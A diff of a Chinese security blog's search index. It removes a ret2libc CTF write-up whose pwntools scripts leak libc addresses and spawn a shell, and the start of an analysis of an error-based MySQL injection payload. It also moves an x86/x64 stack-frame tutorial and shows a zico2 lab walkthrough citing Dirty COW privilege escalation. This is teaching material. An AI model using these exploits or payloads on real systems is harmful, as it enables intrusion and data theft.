-<p>libc.so-version：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">offset = 112</span><br><span class="line">p = process(&apos;./ret2libc3&apos;)</span><br><span class="line">elf = ELF(&apos;./ret2libc3&apos;)</span><br><span class="line">puts_plt_addr = elf.plt[&apos;puts&apos;]</span><br><span class="line">puts_got_addr = elf.got[&apos;puts&apos;]</span><br><span class="line">main_plt_addr = elf.symbols[&apos;_start&apos;]//程序最初执行地址。</span><br><span class="line">payload = flat([&apos;\x90&apos;*offset,puts_plt_addr,main_plt_addr,puts_got_addr])</span><br><span class="line">p.sendlineafter(&apos;?&apos;,payload)</span><br><span class="line">puts_addr = u32(p.recv()[0:4])</span><br><span class="line">print hex(puts_addr)</span><br></pre></td></tr></table></figure>
-
-<p><img src="/stackoverflow%E4%B9%8Bret2libc-1/image-20191207023018038.png" alt="image-20191207023018038"></p>
-<p><img src="/stackoverflow%E4%B9%8Bret2libc-1/image-20191207023359675.png" alt="image-20191207023359675"></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">system_libc_addr = 	0x03ada0</span><br><span class="line">puts_libc_addr = 0x05fca0</span><br><span class="line">str_bin_sh = 0x15ba0b</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">offset = 112</span><br><span class="line">p = process(&apos;./ret2libc3&apos;)</span><br><span class="line">elf = ELF(&apos;./ret2libc3&apos;)</span><br><span class="line">puts_plt_addr = elf.plt[&apos;puts&apos;]</span><br><span class="line">puts_got_addr = elf.got[&apos;puts&apos;]</span><br><span class="line">main_plt_addr = elf.symbols[&apos;_start&apos;]</span><br><span class="line">payload = flat([&apos;\x90&apos;*offset,puts_plt_addr,main_plt_addr,puts_got_addr])</span><br><span class="line">p.sendlineafter(&apos;?&apos;,payload)</span><br><span class="line">puts_addr = u32(p.recv()[0:4])</span><br><span class="line"></span><br><span class="line">system_libc_addr = 0x03ada0</span><br><span class="line">puts_libc_addr = 0x05fca0</span><br><span class="line">str_bin_sh = 0x15ba0b</span><br><span class="line"></span><br><span class="line">libc_base_addr = puts_addr - puts_libc_addr</span><br><span class="line">system_addr = libc_base_addr + system_libc_addr</span><br><span class="line">binsh_addr = libc_base_addr + str_bin_sh</span><br><span class="line">payload1 = flat([&apos;\x90&apos;*offset,system_addr,0xdeadbeef,binsh_addr])</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<p><img src="/stackoverflow%E4%B9%8Bret2libc-1/image-20191207024743608.png" alt="image-20191207024743608"></p>
-<h2 id="train-cs-nctu-edu-tw-ret2libc"><a href="#train-cs-nctu-edu-tw-ret2libc" class="headerlink" title="train.cs.nctu.edu.tw: ret2libc"></a>train.cs.nctu.edu.tw: ret2libc</h2><p><strong>1、checksec</strong></p>
-<p><img src="/stackoverflow%E4%B9%8Bret2libc-1/image-20191207030438537.png" alt="image-20191207030438537"></p>
-<p>开启NX和Partial RELR0,同时泄露出<code>/bin/sh</code>和<code>puts</code>的地址。</p>
-<p><img src="/stackoverflow%E4%B9%8Bret2libc-1/image-20191207031106045.png" alt="image-20191207031106045"></p>
-<p>binary中没有<code>system</code>的地址。</p>
-<p><strong>2、IDA</strong></p>
-<p><img src="/stackoverflow%E4%B9%8Bret2libc-1/image-20191207031213696.png" alt="image-20191207031213696"></p>
-<p>溢出空间=0x14+4+4+4=32。</p>
-<p><strong>3、pwn</strong></p>
-<p><img src="/stackoverflow%E4%B9%8Bret2libc-1/image-20191207032133227.png" alt="image-20191207032133227"></p>
-<p><strong>4、exploit</strong></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import LibcSearcher</span><br><span class="line">offset = 32</span><br><span class="line">p = process(&apos;./ret2libc&apos;)</span><br><span class="line">p.recvuntil(&apos;is &apos;)</span><br><span class="line">binsh_addr = int(p.recvuntil(&apos;\n&apos;),16)</span><br><span class="line">print hex(binsh_addr)</span><br><span class="line">p.recvuntil(&apos;is &apos;)</span><br><span class="line">puts_addr = int(p.recvuntil(&apos;\n&apos;),16)</span><br><span class="line">print hex(puts_addr)</span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(&apos;puts&apos;,puts_addr)</span><br><span class="line">libc_base_addr = puts_addr - libc.dump(&apos;puts&apos;)</span><br><span class="line">system_addr = libc_base_addr + libc.dump(&apos;system&apos;)</span><br><span class="line"></span><br><span class="line">payload = flat([&apos;\x90&apos;*offset,system_addr,0xdeadbeef,binsh_addr])</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<p><img src="/stackoverflow%E4%B9%8Bret2libc-1/image-20191207033252435.png" alt="image-20191207033252435"></p>
-<h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p>github-ctf-wiki</p>
 ]]></content>
   </entry>
   <entry>
@@ -3026,6 +3016,20 @@ https://websec.readthedocs.io/zh/latest/basic/http.html</code></pre></center>]]>
 ]]></content>
   </entry>
   <entry>
+    <title>x86架构与x64架构在函数于栈中调用过程的不同之处</title>
+    <url>/x86%E6%9E%B6%E6%9E%84%E4%B8%8Ex64%E6%9E%B6%E6%9E%84%E5%9C%A8%E5%87%BD%E6%95%B0%E4%BA%8E%E6%A0%88%E4%B8%AD%E8%B0%83%E7%94%A8%E8%BF%87%E7%A8%8B%E7%9A%84%E4%B8%8D%E5%90%8C%E4%B9%8B%E5%A4%84/</url>
+    <content><![CDATA[<h1 id="x86架构与x64架构"><a href="#x86架构与x64架构" class="headerlink" title="x86架构与x64架构"></a>x86架构与x64架构</h1><p>1、x86架构<br>x86架构是intel开发的一种32位的指令集。<br>8个32位通用寄存器<code>eax,ebx,ecx,edx,ebp,esp,esi,edi</code>。</p>
+<p>2、x64架构<br>x64架构是64位的，有16个通用寄存器<code>rax,rbx,rcx,rdx,rsi,rdi,rsp,rbp,r8,r9,r10,r11,r12,r13,r14,r15</code>。</p>
+<h1 id="程序"><a href="#程序" class="headerlink" title="程序"></a>程序</h1><p>1、代码<br><img src="/x86%E6%9E%B6%E6%9E%84%E4%B8%8Ex64%E6%9E%B6%E6%9E%84%E5%9C%A8%E5%87%BD%E6%95%B0%E4%BA%8E%E6%A0%88%E4%B8%AD%E8%B0%83%E7%94%A8%E8%BF%87%E7%A8%8B%E7%9A%84%E4%B8%8D%E5%90%8C%E4%B9%8B%E5%A4%84/1.png" alt><br>2、编译链接</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">32位：</span><br><span class="line">sudo gcc stack.c -o stack -m32</span><br><span class="line"></span><br><span class="line">64位：</span><br><span class="line">sudo gcc stack.c -o stack1</span><br></pre></td></tr></table></figure>
+<p><img src="/x86%E6%9E%B6%E6%9E%84%E4%B8%8Ex64%E6%9E%B6%E6%9E%84%E5%9C%A8%E5%87%BD%E6%95%B0%E4%BA%8E%E6%A0%88%E4%B8%AD%E8%B0%83%E7%94%A8%E8%BF%87%E7%A8%8B%E7%9A%84%E4%B8%8D%E5%90%8C%E4%B9%8B%E5%A4%84/2.png" alt></p>
+<h1 id="x86架构下函数于栈中调用过程"><a href="#x86架构下函数于栈中调用过程" class="headerlink" title="x86架构下函数于栈中调用过程"></a>x86架构下函数于栈中调用过程</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0804840b &lt;Add&gt;:</span><br><span class="line"> 804840b:	55                   	push   ebp          //将ebp压入栈</span><br><span class="line"> 804840c:	89 e5                	mov    ebp,esp      //将esp压入栈</span><br><span class="line"> 804840e:	83 ec 08             	sub    esp,0x8      //抬高栈帧</span><br><span class="line"> 8048411:	8b 55 08             	mov    edx,DWORD PTR [ebp+0x8]  //将[ebp+0x8]压入edx</span><br><span class="line"> 8048414:	8b 45 0c             	mov    eax,DWORD PTR [ebp+0xc]  //将[ebp+0xc]压入eax</span><br><span class="line"> 8048417:	01 d0                	add    eax,edx  //将eax与edx中的内容相加赋给eax</span><br><span class="line"> 8048419:	83 ec 08             	sub    esp,0x8  //抬高栈帧</span><br><span class="line"> 804841c:	50                   	push   eax  //将eax压入栈</span><br><span class="line"> 804841d:	68 e0 84 04 08       	push   0x80484e0    //压入x+y=</span><br><span class="line"> 8048422:	e8 b9 fe ff ff       	call   80482e0 &lt;printf@plt&gt; //调用printf函数</span><br><span class="line"> 8048427:	83 c4 10             	add    esp,0x10 //调整栈帧</span><br><span class="line"> 804842a:	90                   	nop</span><br><span class="line"> 804842b:	c9                   	leave  </span><br><span class="line"> 804842c:	c3                   	ret    </span><br><span class="line"></span><br><span class="line">0804842d &lt;main&gt;:</span><br><span class="line"> 804842d:	8d 4c 24 04          	lea    ecx,[esp+0x4]</span><br><span class="line"> 8048431:	83 e4 f0             	and    esp,0xfffffff0</span><br><span class="line"> 8048434:	ff 71 fc             	push   DWORD PTR [ecx-0x4]</span><br><span class="line"></span><br><span class="line"> 8048437:	55                   	push   ebp      //将ebp压入栈</span><br><span class="line"> 8048438:	89 e5                	mov    ebp,esp  //将esp压入栈</span><br><span class="line"> 804843a:	51                   	push   ecx      //将ecx压入栈</span><br><span class="line"> 804843b:	83 ec 04             	sub    esp,0x4  //抬高栈帧,esp=esp+0x4</span><br><span class="line"> 804843e:	83 ec 08             	sub    esp,0x8  //抬高栈帧</span><br><span class="line"> 8048441:	6a 14                	push   0x14     //压入参数20</span><br><span class="line"> 8048443:	6a 0a                	push   0xa      //压入参数10</span><br><span class="line"> 8048445:	e8 c1 ff ff ff       	call   804840b &lt;Add&gt;    //调用Add函数</span><br><span class="line"> 804844a:	83 c4 10             	add    esp,0x10 //调整栈帧</span><br><span class="line"> 804844d:	b8 00 00 00 00       	mov    eax,0x0  //清空eax</span><br><span class="line"> 8048452:	8b 4d fc             	mov    ecx,DWORD PTR [ebp-0x4]  //将[ebp-0x4]内的数据赋给ecx</span><br><span class="line"> 8048455:	c9                   	leave           //mov esp,ebp;pop ebp  </span><br><span class="line"> 8048456:	8d 61 fc             	lea    esp,[ecx-0x4]    //取[ecx-0x4]中的数据赋给esp</span><br><span class="line"> 8048459:	c3                   	ret             //pop eip</span><br><span class="line"></span><br><span class="line"> 804845a:	66 90                	xchg   ax,ax</span><br><span class="line"> 804845c:	66 90                	xchg   ax,ax</span><br><span class="line"> 804845e:	66 90                	xchg   ax,ax</span><br></pre></td></tr></table></figure>
+<h1 id="x64架构下函数于栈中调用过程"><a href="#x64架构下函数于栈中调用过程" class="headerlink" title="x64架构下函数于栈中调用过程"></a>x64架构下函数于栈中调用过程</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0000000000400526 &lt;Add&gt;:</span><br><span class="line">  400526:	55                   	push   rbp          //将rbp压入栈中</span><br><span class="line">  400527:	48 89 e5             	mov    rbp,rsp      //将rsp压入栈中</span><br><span class="line">  40052a:	48 83 ec 10          	sub    rsp,0x10     //抬高栈帧</span><br><span class="line">  40052e:	89 7d fc             	mov    DWORD PTR [rbp-0x4],edi  //将edi的值赋给[rbp-0x4]</span><br><span class="line">  400531:	89 75 f8             	mov    DWORD PTR [rbp-0x8],esi  //将rsi的值赋给[rbp-0x10]</span><br><span class="line">  400534:	8b 55 fc             	mov    edx,DWORD PTR [rbp-0x4]  //将[rbp-0x4]的值赋给edx</span><br><span class="line">  400537:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]  //将[rbp-0x8]的值赋给eax</span><br><span class="line">  40053a:	01 d0                	add    eax,edx                  //eax=eax+edx</span><br><span class="line">  40053c:	89 c6                	mov    esi,eax                  //将eax的值赋给esi</span><br><span class="line">  40053e:	bf 04 06 40 00       	mov    edi,0x400604         //将0x400604对应的数据赋给edi</span><br><span class="line">  400543:	b8 00 00 00 00       	mov    eax,0x0              //清空eax</span><br><span class="line">  400548:	e8 b3 fe ff ff       	call   400400 &lt;printf@plt&gt;  //调用printf函数</span><br><span class="line">  40054d:	90                   	nop</span><br><span class="line">  40054e:	c9                   	leave  </span><br><span class="line">  40054f:	c3                   	ret    </span><br><span class="line"></span><br><span class="line">0000000000400550 &lt;main&gt;:</span><br><span class="line">  400550:	55                   	push   rbp          //将rbp压入栈中</span><br><span class="line">  400551:	48 89 e5             	mov    rbp,rsp      //将rsp压入栈中</span><br><span class="line">  400554:	48 83 ec 10          	sub    rsp,0x10     //抬高栈帧</span><br><span class="line">  400558:	89 7d fc             	mov    DWORD PTR [rbp-0x4],edi  //将edi的值赋给[rbp-0x4]</span><br><span class="line">  40055b:	48 89 75 f0          	mov    QWORD PTR [rbp-0x10],rsi //将rsi的值赋给[rbp-0x10]</span><br><span class="line">  40055f:	be 14 00 00 00       	mov    esi,0x14     //将参数20赋给esi</span><br><span class="line">  400564:	bf 0a 00 00 00       	mov    edi,0xa      //将参数10赋给edi</span><br><span class="line">  400569:	e8 b8 ff ff ff       	call   400526 &lt;Add&gt; //调用Add函数</span><br><span class="line">  40056e:	b8 00 00 00 00       	mov    eax,0x0      //清空eax</span><br><span class="line">  400573:	c9                   	leave               //mov esp,ebp;pop ebp</span><br><span class="line">  400574:	c3                   	ret                 //pop eip   </span><br><span class="line">  400575:	66 2e 0f 1f 84 00 00 	nop    WORD PTR cs:[rax+rax*1+0x0]</span><br><span class="line">  40057c:	00 00 00</span><br><span class="line">  40057f:	90                   	nop</span><br></pre></td></tr></table></figure>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>x86架构与x64架构在函数于栈中调用过程的不同之处在于：<br>x86架构下，函数的参数是直接存放到栈帧中的；<br>而x64架构下，函数的参数是通过寄存器传参进入栈帧的。（当寄存器不够用，才会将参数直接存入栈帧）</p>
+<h1 id="下期预告"><a href="#下期预告" class="headerlink" title="下期预告"></a>下期预告</h1><p>函数调用约定</p>
+]]></content>
+  </entry>
+  <entry>
     <title>靶机渗透训练之zico2</title>
     <url>/zico2/</url>
     <content><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>目标靶机ip:192.168.154.154</p>
@@ -3055,83 +3059,6 @@ https://websec.readthedocs.io/zh/latest/basic/http.html</code></pre></center>]]>
 <h2 id="提升权限"><a href="#提升权限" class="headerlink" title="提升权限"></a>提升权限</h2><p>脏牛提权：</p>
 <p><img src="/zico2/image-20191201014255427.png" alt="image-20191201014255427"></p>
 <h2 id="提取flag"><a href="#提取flag" class="headerlink" title="提取flag"></a>提取flag</h2><p><img src="/zico2/image-20191201014328846.png" alt="image-20191201014328846"></p>
-]]></content>
-  </entry>
-  <entry>
-    <title>x86架构与x64架构在函数于栈中调用过程的不同之处</title>
-    <url>/x86%E6%9E%B6%E6%9E%84%E4%B8%8Ex64%E6%9E%B6%E6%9E%84%E5%9C%A8%E5%87%BD%E6%95%B0%E4%BA%8E%E6%A0%88%E4%B8%AD%E8%B0%83%E7%94%A8%E8%BF%87%E7%A8%8B%E7%9A%84%E4%B8%8D%E5%90%8C%E4%B9%8B%E5%A4%84/</url>
-    <content><![CDATA[<h1 id="x86架构与x64架构"><a href="#x86架构与x64架构" class="headerlink" title="x86架构与x64架构"></a>x86架构与x64架构</h1><p>1、x86架构<br>x86架构是intel开发的一种32位的指令集。<br>8个32位通用寄存器<code>eax,ebx,ecx,edx,ebp,esp,esi,edi</code>。</p>
-<p>2、x64架构<br>x64架构是64位的，有16个通用寄存器<code>rax,rbx,rcx,rdx,rsi,rdi,rsp,rbp,r8,r9,r10,r11,r12,r13,r14,r15</code>。</p>
-<h1 id="程序"><a href="#程序" class="headerlink" title="程序"></a>程序</h1><p>1、代码<br><img src="/x86%E6%9E%B6%E6%9E%84%E4%B8%8Ex64%E6%9E%B6%E6%9E%84%E5%9C%A8%E5%87%BD%E6%95%B0%E4%BA%8E%E6%A0%88%E4%B8%AD%E8%B0%83%E7%94%A8%E8%BF%87%E7%A8%8B%E7%9A%84%E4%B8%8D%E5%90%8C%E4%B9%8B%E5%A4%84/1.png" alt><br>2、编译链接</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">32位：</span><br><span class="line">sudo gcc stack.c -o stack -m32</span><br><span class="line"></span><br><span class="line">64位：</span><br><span class="line">sudo gcc stack.c -o stack1</span><br></pre></td></tr></table></figure>
-<p><img src="/x86%E6%9E%B6%E6%9E%84%E4%B8%8Ex64%E6%9E%B6%E6%9E%84%E5%9C%A8%E5%87%BD%E6%95%B0%E4%BA%8E%E6%A0%88%E4%B8%AD%E8%B0%83%E7%94%A8%E8%BF%87%E7%A8%8B%E7%9A%84%E4%B8%8D%E5%90%8C%E4%B9%8B%E5%A4%84/2.png" alt></p>
-<h1 id="x86架构下函数于栈中调用过程"><a href="#x86架构下函数于栈中调用过程" class="headerlink" title="x86架构下函数于栈中调用过程"></a>x86架构下函数于栈中调用过程</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0804840b &lt;Add&gt;:</span><br><span class="line"> 804840b:	55                   	push   ebp          //将ebp压入栈</span><br><span class="line"> 804840c:	89 e5                	mov    ebp,esp      //将esp压入栈</span><br><span class="line"> 804840e:	83 ec 08             	sub    esp,0x8      //抬高栈帧</span><br><span class="line"> 8048411:	8b 55 08             	mov    edx,DWORD PTR [ebp+0x8]  //将[ebp+0x8]压入edx</span><br><span class="line"> 8048414:	8b 45 0c             	mov    eax,DWORD PTR [ebp+0xc]  //将[ebp+0xc]压入eax</span><br><span class="line"> 8048417:	01 d0                	add    eax,edx  //将eax与edx中的内容相加赋给eax</span><br><span class="line"> 8048419:	83 ec 08             	sub    esp,0x8  //抬高栈帧</span><br><span class="line"> 804841c:	50                   	push   eax  //将eax压入栈</span><br><span class="line"> 804841d:	68 e0 84 04 08       	push   0x80484e0    //压入x+y=</span><br><span class="line"> 8048422:	e8 b9 fe ff ff       	call   80482e0 &lt;printf@plt&gt; //调用printf函数</span><br><span class="line"> 8048427:	83 c4 10             	add    esp,0x10 //调整栈帧</span><br><span class="line"> 804842a:	90                   	nop</span><br><span class="line"> 804842b:	c9                   	leave  </span><br><span class="line"> 804842c:	c3                   	ret    </span><br><span class="line"></span><br><span class="line">0804842d &lt;main&gt;:</span><br><span class="line"> 804842d:	8d 4c 24 04          	lea    ecx,[esp+0x4]</span><br><span class="line"> 8048431:	83 e4 f0             	and    esp,0xfffffff0</span><br><span class="line"> 8048434:	ff 71 fc             	push   DWORD PTR [ecx-0x4]</span><br><span class="line"></span><br><span class="line"> 8048437:	55                   	push   ebp      //将ebp压入栈</span><br><span class="line"> 8048438:	89 e5                	mov    ebp,esp  //将esp压入栈</span><br><span class="line"> 804843a:	51                   	push   ecx      //将ecx压入栈</span><br><span class="line"> 804843b:	83 ec 04             	sub    esp,0x4  //抬高栈帧,esp=esp+0x4</span><br><span class="line"> 804843e:	83 ec 08             	sub    esp,0x8  //抬高栈帧</span><br><span class="line"> 8048441:	6a 14                	push   0x14     //压入参数20</span><br><span class="line"> 8048443:	6a 0a                	push   0xa      //压入参数10</span><br><span class="line"> 8048445:	e8 c1 ff ff ff       	call   804840b &lt;Add&gt;    //调用Add函数</span><br><span class="line"> 804844a:	83 c4 10             	add    esp,0x10 //调整栈帧</span><br><span class="line"> 804844d:	b8 00 00 00 00       	mov    eax,0x0  //清空eax</span><br><span class="line"> 8048452:	8b 4d fc             	mov    ecx,DWORD PTR [ebp-0x4]  //将[ebp-0x4]内的数据赋给ecx</span><br><span class="line"> 8048455:	c9                   	leave           //mov esp,ebp;pop ebp  </span><br><span class="line"> 8048456:	8d 61 fc             	lea    esp,[ecx-0x4]    //取[ecx-0x4]中的数据赋给esp</span><br><span class="line"> 8048459:	c3                   	ret             //pop eip</span><br><span class="line"></span><br><span class="line"> 804845a:	66 90                	xchg   ax,ax</span><br><span class="line"> 804845c:	66 90                	xchg   ax,ax</span><br><span class="line"> 804845e:	66 90                	xchg   ax,ax</span><br></pre></td></tr></table></figure>
-<h1 id="x64架构下函数于栈中调用过程"><a href="#x64架构下函数于栈中调用过程" class="headerlink" title="x64架构下函数于栈中调用过程"></a>x64架构下函数于栈中调用过程</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0000000000400526 &lt;Add&gt;:</span><br><span class="line">  400526:	55                   	push   rbp          //将rbp压入栈中</span><br><span class="line">  400527:	48 89 e5             	mov    rbp,rsp      //将rsp压入栈中</span><br><span class="line">  40052a:	48 83 ec 10          	sub    rsp,0x10     //抬高栈帧</span><br><span class="line">  40052e:	89 7d fc             	mov    DWORD PTR [rbp-0x4],edi  //将edi的值赋给[rbp-0x4]</span><br><span class="line">  400531:	89 75 f8             	mov    DWORD PTR [rbp-0x8],esi  //将rsi的值赋给[rbp-0x10]</span><br><span class="line">  400534:	8b 55 fc             	mov    edx,DWORD PTR [rbp-0x4]  //将[rbp-0x4]的值赋给edx</span><br><span class="line">  400537:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]  //将[rbp-0x8]的值赋给eax</span><br><span class="line">  40053a:	01 d0                	add    eax,edx                  //eax=eax+edx</span><br><span class="line">  40053c:	89 c6                	mov    esi,eax                  //将eax的值赋给esi</span><br><span class="line">  40053e:	bf 04 06 40 00       	mov    edi,0x400604         //将0x400604对应的数据赋给edi</span><br><span class="line">  400543:	b8 00 00 00 00       	mov    eax,0x0              //清空eax</span><br><span class="line">  400548:	e8 b3 fe ff ff       	call   400400 &lt;printf@plt&gt;  //调用printf函数</span><br><span class="line">  40054d:	90                   	nop</span><br><span class="line">  40054e:	c9                   	leave  </span><br><span class="line">  40054f:	c3                   	ret    </span><br><span class="line"></span><br><span class="line">0000000000400550 &lt;main&gt;:</span><br><span class="line">  400550:	55                   	push   rbp          //将rbp压入栈中</span><br><span class="line">  400551:	48 89 e5             	mov    rbp,rsp      //将rsp压入栈中</span><br><span class="line">  400554:	48 83 ec 10          	sub    rsp,0x10     //抬高栈帧</span><br><span class="line">  400558:	89 7d fc             	mov    DWORD PTR [rbp-0x4],edi  //将edi的值赋给[rbp-0x4]</span><br><span class="line">  40055b:	48 89 75 f0          	mov    QWORD PTR [rbp-0x10],rsi //将rsi的值赋给[rbp-0x10]</span><br><span class="line">  40055f:	be 14 00 00 00       	mov    esi,0x14     //将参数20赋给esi</span><br><span class="line">  400564:	bf 0a 00 00 00       	mov    edi,0xa      //将参数10赋给edi</span><br><span class="line">  400569:	e8 b8 ff ff ff       	call   400526 &lt;Add&gt; //调用Add函数</span><br><span class="line">  40056e:	b8 00 00 00 00       	mov    eax,0x0      //清空eax</span><br><span class="line">  400573:	c9                   	leave               //mov esp,ebp;pop ebp</span><br><span class="line">  400574:	c3                   	ret                 //pop eip   </span><br><span class="line">  400575:	66 2e 0f 1f 84 00 00 	nop    WORD PTR cs:[rax+rax*1+0x0]</span><br><span class="line">  40057c:	00 00 00</span><br><span class="line">  40057f:	90                   	nop</span><br></pre></td></tr></table></figure>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>x86架构与x64架构在函数于栈中调用过程的不同之处在于：<br>x86架构下，函数的参数是直接存放到栈帧中的；<br>而x64架构下，函数的参数是通过寄存器传参进入栈帧的。（当寄存器不够用，才会将参数直接存入栈帧）</p>
-<h1 id="下期预告"><a href="#下期预告" class="headerlink" title="下期预告"></a>下期预告</h1><p>函数调用约定</p>
-]]></content>
-  </entry>
-  <entry>
-    <title>一条payload发生的事情(来自对报错注入的思考)</title>
-    <url>/%E4%B8%80%E6%9D%A1payload%E5%8F%91%E7%94%9F%E7%9A%84%E4%BA%8B%E6%83%85/</url>
-    <content><![CDATA[<h1 id="1、前言"><a href="#1、前言" class="headerlink" title="1、前言"></a>1、前言</h1><p>最近在重新整理复现<a href="https://github.com/RJ45mp/material/blob/master/MYSQL%E6%B3%A8%E5%85%A5%E5%A4%A9%E4%B9%A6.pdf" target="_blank" rel="noopener">MYSQL注入天书</a>,遇到了一条很有意思的报错注入的payload：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2)) a from information_schema.columns group by a;</span><br></pre></td></tr></table></figure>
-<p>记录一下，对这个payload的逆向理解。</p>
-<h1 id="2、环境"><a href="#2、环境" class="headerlink" title="2、环境"></a>2、环境</h1><p><img src="/%E4%B8%80%E6%9D%A1payload%E5%8F%91%E7%94%9F%E7%9A%84%E4%BA%8B%E6%83%85/1.png" alt></p>
-<h1 id="3、约束与安全"><a href="#3、约束与安全" class="headerlink" title="3、约束与安全"></a>3、约束与安全</h1><p>在mysql中，无论是主键还是外键都有约束的设置，其属性有两个:非空性和唯一性，也即我们常说的非空唯一。唯一性表现为<br>在插入一条数据时，如果数据中的主键与表中某条数据的主键相同，则插入不成功，同时mysql会返回错误的信息。<br>在对错误信息的处理和返回过程中，mysql的底层代码实现将插入不成功的那条数据对应的主键返回到了错误信息里面，由此产生了一个安全性的问题—-暴露出了表中已存在的那条数据的主键。<br><img src="/%E4%B8%80%E6%9D%A1payload%E5%8F%91%E7%94%9F%E7%9A%84%E4%BA%8B%E6%83%85/2.png" alt></p>
-<h1 id="4、子查询控制主键位置"><a href="#4、子查询控制主键位置" class="headerlink" title="4、子查询控制主键位置"></a>4、子查询控制主键位置</h1><p>如何利用约束造成的错误带来的泄露问题？一个本质问题是：<br>我们能控制什么？我们能控制暴露出存在主键约束的表的已知数据的主键。(通过输入点，也就是构造与已知数据主键相同的数据插入，从而报错暴露出主键)<br>我们要获得什么？从控制点的形式来看(一个数据显示点)，我们要获得的只能是数据库中的数据信息。<br>怎么样才能通过我们能控制的来获取我们要获得的？一个方法是子查询控制主键位置。<br>子查询是指一个查询语句嵌套在另一个查询语句内部的查询。<br>在执行查询语句的时候，首先会执行子查询中的语句，然后将返回的结果作为外层查询的过滤条件。<br>我们期望，子查询语句为我们想要获取的信息的sql语句，外层sql语句存在含有主键唯一性的表，接着设置子查询语句于主键字段位置，构造主键唯一性冲突，将报错信息回显出来。<br>要做到这一步，需要解决两个问题：<br>1 在实际的攻击中，表的主键字段是未知的，获取主键字段将是一个难以解决的问题。<br>2 如何设置子查询语句与主键字段之间产生唯一性冲突并且将数据泄露出来，也是一个需要解决的问题。</p>
-<p>验证失败：</p>
-<p><img src="/%E4%B8%80%E6%9D%A1payload%E5%8F%91%E7%94%9F%E7%9A%84%E4%BA%8B%E6%83%85/4.png" alt></p>
-<h1 id="5、聚合函数和group-by建立虚表"><a href="#5、聚合函数和group-by建立虚表" class="headerlink" title="5、聚合函数和group by建立虚表"></a>5、聚合函数和group by建立虚表</h1><p>解决第一个问题的思路在于：既然实表中主键字段存在未知可能，那么建立一个可以控制主键的虚表如何。<br>mysql中的虚拟表分为临时表、内存表和视图。内存表和视图显然不适合此种情景。<br>而临时表的建立有两种方式，一是以实表命名为tmp等，然后在使用完后手动删除。另一种是以聚合函数和group+by的方式建立临时表。<br>在<a href="https://www.docs4dev.com/docs/zh/mysql/5.7/reference/group-by-optimization.html" target="_blank" rel="noopener">mysql的中文文档中</a>有这么一句话：</p>
-<p><img src="/%E4%B8%80%E6%9D%A1payload%E5%8F%91%E7%94%9F%E7%9A%84%E4%BA%8B%E6%83%85/5.png" alt></p>
-<p>由此，通过聚合函数和group+by建立一个可以控制主键的虚表，成为可能：</p>
-<p>可以看到，下面的sql语句在表<code>Rj45</code>的数据条数的基础上，利用count()函数和group by建立了一张主键为<code>database()</code>的虚表</p>
-<p><img src="/%E4%B8%80%E6%9D%A1payload%E5%8F%91%E7%94%9F%E7%9A%84%E4%BA%8B%E6%83%85/6.png" alt></p>
-<p>由于<code>Rj45</code>表，不具有普遍性，参考mysql的基本库，修改为基本库中的表</p>
-<p><img src="/%E4%B8%80%E6%9D%A1payload%E5%8F%91%E7%94%9F%E7%9A%84%E4%BA%8B%E6%83%85/3.png" alt></p>
-<p>mysql.user、information_schema.schemata、information_schema.tables和information_schema.columns</p>
-<p><img src="/%E4%B8%80%E6%9D%A1payload%E5%8F%91%E7%94%9F%E7%9A%84%E4%BA%8B%E6%83%85/7.png" alt></p>
-<h1 id="6、随机因子构造主键唯一性冲突报错"><a href="#6、随机因子构造主键唯一性冲突报错" class="headerlink" title="6、随机因子构造主键唯一性冲突报错"></a>6、随机因子构造主键唯一性冲突报错</h1><p>第二个问题：如何设置子查询语句与主键字段之间产生唯一性冲突。<br>主键字段现在我们已经可以控制，需要构造唯一性冲突错误，那么就需要在虚表的建立过程中主键字段存在不一样的数值，并且在基于基本库中的表的数据条数不少于3条，如此在第三次查询建立虚表数据的过程中才会保证主键唯一性冲突的可能。</p>
-<p>故，第一：在mysql.user、information_schema.schemata、information_schema.tables和information_schema.columns中，根据数据条目的多少和普遍程度，冲突的可能性越来越大。(难说有没有存在一个mysql中只有一个库、一个表的存在的情况，不过一个字段就绝对不会出现)<br>保险起见，最好以information_schema.columns为基础，建立虚表。</p>
-<p>第二：如何使得虚表在建立的过程中，主键字段存在不一样的数值。<br>一个想法是利用mysql的随机函数rand(),该函数会在0和1之间随机产生数据</p>
-<p><img src="/%E4%B8%80%E6%9D%A1payload%E5%8F%91%E7%94%9F%E7%9A%84%E4%BA%8B%E6%83%85/8.png" alt></p>
-<p>在随机函数的基础上添加rand()*2,然后结合floor()函数，该函数的作用是在数据中返回整数部分，就可以构造出随机的0和1两组数据</p>
-<p><img src="/%E4%B8%80%E6%9D%A1payload%E5%8F%91%E7%94%9F%E7%9A%84%E4%BA%8B%E6%83%85/9.png" alt></p>
-<p>在验证过程中，发现虽然达到了预期的结果，可是报错存在不确定性(一会报错，一会正常)，并且报错的主键数据值也不稳定(一会为0，一会为1)。</p>
